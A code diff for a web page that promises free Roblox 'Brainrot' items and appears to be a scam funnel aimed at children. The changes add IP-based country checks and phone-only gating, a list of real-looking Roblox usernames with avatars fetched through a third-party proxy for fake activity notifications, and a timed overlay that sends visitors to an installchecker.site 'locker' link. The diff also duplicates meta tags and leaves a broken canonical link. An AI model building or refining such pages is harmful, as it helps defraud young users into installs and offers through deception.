@@ -16,25 +16,17 @@
     // Policy says restrictions apply to iOS vs Android only; desktops have
     // no explicit rule so we let them through (adjust if needed).
 
-    // ── 2. Country detection (sync, before paint) ───────────────────────
-    // Prefer HTTPS providers. If detection fails, we fail open for phones.
-    var countryCode = '__UNKNOWN__';
+    // ── 2. Country detection via ip-api.com (free, no key) ──────────────
+    //    We fire a synchronous XHR so the check happens before paint.
+    //    ip-api returns JSON with a `countryCode` field (ISO 3166-1 alpha-2).
+    var countryCode = null;
     try {
       var xhr = new XMLHttpRequest();
-      xhr.open('GET', 'https://ipapi.co/json/', false); // sync
+      xhr.open('GET', 'http://ip-api.com/json/?fields=countryCode', false); // sync
       xhr.send(null);
       if (xhr.status === 200) {
         var data = JSON.parse(xhr.responseText);
-        countryCode = (data.country_code || '').toUpperCase() || '__UNKNOWN__';
-      } else {
-        // Fallback provider
-        var fb = new XMLHttpRequest();
-        fb.open('GET', 'https://ipwho.is/', false); // sync
-        fb.send(null);
-        if (fb.status === 200) {
-          var fbData = JSON.parse(fb.responseText);
-          countryCode = (fbData.country_code || '').toUpperCase() || '__UNKNOWN__';
-        }
+        countryCode = (data.countryCode || '').toUpperCase();
       }
     } catch (e) {
       // If geolocation fails, fail open (allow access) to avoid false blocks.
@@ -44,7 +36,7 @@
     // ── 3. Allowed-country list (iOS + Android both OK) ─────────────────
     var DUAL_ACCESS_COUNTRIES = [
       'FR','DE','GB','BE','DK','NL','NO','PL',
-      'AU','CA','IT','ES','CH','LU','SI','CY','US'
+      'AU','CA','IT','ES','CH','LU','SI','CY'
     ];
 
     // ── 4. Decision logic ────────────────────────────────────────────────
@@ -55,8 +47,10 @@
     // Block desktops and tablets — phones only
     if (!isIOS && !isAndroid) { redirect('phone_only'); return; }
 
-    if (countryCode === '__UNKNOWN__') {
-      // Unknown country (API blocked/failure): allow both phone OSes.
+    if (countryCode === 'US') {
+      // United States: Android only
+      if (isIOS) { redirect('android_only'); return; }
+      // Android → allow
     } else if (DUAL_ACCESS_COUNTRIES.indexOf(countryCode) !== -1) {
       // Dual-access country: both iOS & Android OK → allow
     } else {
@@ -79,7 +73,7 @@
   <meta property="og:title" content="Roblox Brainrots 2025 | Steal Your Brainrot">
   <meta property="og:description" content="🎮 Get Roblox Brainrots: Strawberry Elephant, Meowl, Skibidi Toilet & More! Real Website. Steal Your Brainrot Now!">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://www.brainrotszone.site/">
+  <meta property="og:url" content="https://bloxgarden.vercel.app/">
   <meta property="og:image" content="images/logo2.webp">
   
   <!-- Twitter Cards -->
@@ -91,7 +85,7 @@
   <meta name="language" content="English">
   <meta name="revisit-after" content="1 days">
   <meta name="distribution" content="global">
-  <link rel="canonical" href="https://www.brainrotszone.site/">
+  <link rel="canonical" href="https://www.brainrotszone.site/>
   
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
   <script src="js/jquery-3.6.0.min.js"></script>
@@ -1161,14 +1155,18 @@
       font-weight: bold;
     }
   </style>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-WK4353NSMZ"></script>
+<link rel="me" href="https://www.blogger.com/profile/09867707712002395245">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+<link rel="me" href="https://www.blogger.com/profile/11765107438099270178">
+<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
+<meta name="google-adsense-platform-domain" content="blogspot.com">
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-J1BSNLE03B"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
-  gtag('config', 'G-WK4353NSMZ');
+  gtag('config', 'G-J1BSNLE03B');
 </script>
 
 
@@ -1332,8 +1330,63 @@
 
     const usernames = [
       'Liliana_Cupcake1',
-	  'spee',
-      'Shishymcfishy',
+      'PixelNinja123',
+      'ayoletgo',
+      'Dreamycloudxo',
+      'lily_l0llyp0p',
+      'lilypaddd11',
+      'Sisi_7901',
+      'him90236',
+      'Queenbee_mavi',
+      'reto21r',
+      'Emmagirl0916',
+      '3mmqza',
+      'parassinitu',
+      'laxyaaa',
+      'Battal_216',
+      'bangakumakan',
+      'DDDDEdZZ',
+      'Anhtomdepzai',
+      'XAGXcallYTCH',
+      'Moonee_Play',
+      'hotspot5671',
+      'CyberXIndo',
+      'AT111114',
+      'wDetrox',
+      'Eightnesses',
+      'EightPxth',
+      'Ishowspeedjr2nd',
+      'angel1789tay',
+      'gardenwindut',
+      'needscreativity',
+      'Richy_544',
+      'Gojo890374',
+      'mystic_vibesxx',
+      'spee',
+      'sophiamarie26fifi',
+      'JaxAttack332',
+      'Gokart_6',
+      'SpEe1214',
+      '65gengar',
+      'nicessw1119',
+      'AdmiralGrafSpee_CA',
+      'tg7hir8',
+      'PEDRO_L0I',
+      'LPSrITPu4w',
+      'Prinz_Spee',
+      'Gaberison_4',
+      'RubyPLayerXL',
+      '67wadcgr',
+      'BrickOBrock',
+      'rankyz25',
+      'Actionbrixton',
+      'Emerald_Wizard34',
+      'Bricks0314',
+      'Bricked_beans',
+      'Brick_Sargent',
+      'brickstutong21',
+      'brickeater_89',
+      'Bricknett'
     ];
     
     // ── Dynamic Roblox Avatar Loader ────────────────────────────────────────────
@@ -1341,159 +1394,66 @@
     // Fetches avatars for all usernames in the background, staggered to avoid
     // overloading the proxy. Results are cached in sessionStorage for the tab.
 
-   // ── Avatar System v2 (multi-strategy, batched) ─────────────────────────────
-const FALLBACK_AVATAR = 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
-const AVATAR_CACHE_KEY = 'rbx_av_v3';
-const avatarCache = {};
+    const FALLBACK_AVATAR = 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
+    const AVATAR_PROXY = 'https://abadaoucht.com/tiktok/api/roblox/userinfo/';
+    const AVATAR_CACHE_KEY = 'roblox_avatar_cache_v2';
+    const STAGGER_MS = 300; // delay between each request to be proxy-friendly
 
-/* 1. Seed from sessionStorage */
-try {
-  const s = JSON.parse(sessionStorage.getItem(AVATAR_CACHE_KEY) || '{}');
-  Object.assign(avatarCache, s);
-} catch(_) {}
+    // username (lowercase) → avatar URL
+    const avatarCache = {};
 
-function saveCache() {
-  try { sessionStorage.setItem(AVATAR_CACHE_KEY, JSON.stringify(avatarCache)); } catch(_) {}
-}
-
-/* 2. Verify an image URL actually loads */
-function verifyImg(url, ms = 5000) {
-  return new Promise(res => {
-    const img = new Image();
-    const t = setTimeout(() => res(false), ms);
-    img.onload  = () => { clearTimeout(t); res(true);  };
-    img.onerror = () => { clearTimeout(t); res(false); };
-    img.src = url;
-  });
-}
-
-/* 3. Strategy A – Roblox users endpoint (username → userId) */
-async function strategyRobloxDirect(username) {
-  const r = await fetch(
-    `https://users.roblox.com/v1/usernames/users`,
-    {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
-    }
-  );
-  if (!r.ok) throw new Error('HTTP ' + r.status);
-  const d = await r.json();
-  const id = d?.data?.[0]?.id;
-  if (!id) throw new Error('no id');
-  return `https://www.roblox.com/headshot-thumbnail/image?userId=${id}&width=150&height=150&format=png`;
-}
-
-/* 4. Strategy B – thumbnails batch endpoint (by userId) */
-async function strategyThumbnailBatch(userIds) {
-  const ids = userIds.join(',');
-  const r = await fetch(
-    `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${ids}&size=150x150&format=Png&isCircular=false`
-  );
-  if (!r.ok) throw new Error('HTTP ' + r.status);
-  const d = await r.json();
-  const map = {};
-  (d.data || []).forEach(item => {
-    if (item.imageUrl) map[item.targetId] = item.imageUrl;
-  });
-  return map;
-}
-
-/* 5. Strategy C – proxy fallbacks */
-const PROXIES = [
-  u => `https://oathnet.org/api/service/roblox/userinfo/` + encodeURIComponent(u),
-  u => `https://api.newstargeted.com/roblox/userinfo/`  + encodeURIComponent(u),
-  u => `https://abadaoucht.com/tiktok/api/roblox/userinfo/` + encodeURIComponent(u)
-];
-
-async function strategyProxy(username) {
-  for (const buildUrl of PROXIES) {
+    // Pre-populate from sessionStorage if available
     try {
-      const r = await fetch(buildUrl(username), { cache: 'no-store' });
-      if (!r.ok) continue;
-      const d = await r.json();
-      const av = d?.avatar || d?.avatarUrl || d?.data?.avatar || d?.data?.avatarUrl;
-      if (av && /^https?:\/\//.test(av)) return av;
-      const uid = d?.userId || d?.userid || d?.id || d?.data?.userId || d?.data?.id;
-      if (uid) return `https://www.roblox.com/headshot-thumbnail/image?userId=${uid}&width=150&height=150&format=png`;
-    } catch(_) {}
-  }
-  throw new Error('all proxies failed');
-}
-
-/* 6. Fetch ONE avatar using strategy waterfall */
-async function fetchOneAvatar(username) {
-  const key = username.toLowerCase();
-  if (avatarCache[key]) return avatarCache[key];
-
-  const strategies = [strategyRobloxDirect, strategyProxy];
-  for (const fn of strategies) {
-    try {
-      const url = await fn(username);
-      if (url && await verifyImg(url)) {
-        avatarCache[key] = url;
-        saveCache();
-        return url;
+      const stored = sessionStorage.getItem(AVATAR_CACHE_KEY);
+      if (stored) {
+        const parsed = JSON.parse(stored);
+        Object.assign(avatarCache, parsed);
       }
-    } catch(_) {}
-  }
-  avatarCache[key] = FALLBACK_AVATAR;
-  saveCache();
-  return FALLBACK_AVATAR;
-}
+    } catch (_) {}
 
-/* 7. BATCHED pre-fetch: resolve usernames → IDs in one call,
-      then fetch all thumbnails in one call, then patch cache */
-async function fetchAllAvatars() {
-  const uncached = usernames.filter(u => !avatarCache[u.toLowerCase()]);
-  if (!uncached.length) return;
-
-  // Batch A: username → userId (max 100 per call)
-  const CHUNK = 100;
-  const userIdMap = {}; // username.lower → userId
-
-  for (let i = 0; i < uncached.length; i += CHUNK) {
-    const chunk = uncached.slice(i, i + CHUNK);
-    try {
-      const r = await fetch('https://users.roblox.com/v1/usernames/users', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ usernames: chunk, excludeBannedUsers: false })
-      });
-      if (!r.ok) continue;
-      const d = await r.json();
-      (d.data || []).forEach(u => { if (u.id) userIdMap[u.requestedUsername.toLowerCase()] = u.id; });
-    } catch(_) {}
-  }
-
-  // Batch B: userId → thumbnail URL (max 100 per call)
-  const ids = Object.values(userIdMap);
-  for (let i = 0; i < ids.length; i += CHUNK) {
-    try {
-      const thumbMap = await strategyThumbnailBatch(ids.slice(i, i + CHUNK));
-      // Map back to username keys
-      Object.entries(userIdMap).forEach(([uname, uid]) => {
-        if (thumbMap[uid] && !avatarCache[uname]) {
-          avatarCache[uname] = thumbMap[uid];
+    /**
+     * Fetch one username's avatar from the proxy. Updates avatarCache in place.
+     */
+    async function fetchOneAvatar(username) {
+      const key = username.toLowerCase();
+      if (avatarCache[key]) return; // already cached
+      try {
+        const res = await fetch(AVATAR_PROXY + encodeURIComponent(username));
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data && data.status === 'SUCCESS' && data.avatar) {
+          avatarCache[key] = data.avatar;
         }
-      });
-      saveCache();
-    } catch(_) {}
-  }
-
-  // Fallback: any still-uncached username → individual fetch (non-blocking)
-  uncached.forEach((u, i) => {
-    if (!avatarCache[u.toLowerCase()]) {
-      setTimeout(() => fetchOneAvatar(u), i * 200);
+      } catch (_) {}
     }
-  });
-}
 
-function getAvatarForUsername(username) {
-  return avatarCache[username.toLowerCase()] || FALLBACK_AVATAR;
-}
+    /**
+     * Staggered background fetch for all usernames.
+     * Saves results to sessionStorage once all requests complete.
+     */
+    async function fetchAllAvatars() {
+      // Skip if we already have cached data for most usernames
+      const cachedCount = usernames.filter(u => avatarCache[u.toLowerCase()]).length;
+      if (cachedCount >= usernames.length * 0.8) return; // 80%+ cached → skip
 
-fetchAllAvatars();
+      for (let i = 0; i < usernames.length; i++) {
+        // Non-blocking stagger
+        setTimeout(() => fetchOneAvatar(usernames[i]).then(() => {
+          // Persist to sessionStorage after every successful fetch
+          try { sessionStorage.setItem(AVATAR_CACHE_KEY, JSON.stringify(avatarCache)); } catch (_) {}
+        }), i * STAGGER_MS);
+      }
+    }
+
+    /**
+     * Returns the cached avatar for a username, or FALLBACK_AVATAR.
+     */
+    function getAvatarForUsername(username) {
+      return avatarCache[username.toLowerCase()] || FALLBACK_AVATAR;
+    }
+
+    // Kick off background fetching immediately
+    fetchAllAvatars();
     // ── End Dynamic Roblox Avatar Loader ────────────────────────────────────────
 
     // Game source used in notifications / verification
@@ -1767,7 +1727,7 @@ fetchAllAvatars();
     const showVideoOverlay = () => {
       const popupContent = document.querySelector('.popup-content');
       let timeLeft = 95; // 1:25 in seconds
-      const lockerUrl = "https://installchecker.site/cl/i/rneo6k";
+      const lockerUrl = "https://installchecker.site/cl/i/n66n29";
       
       const formatTime = (seconds) => {
         const mins = Math.floor(seconds / 60);
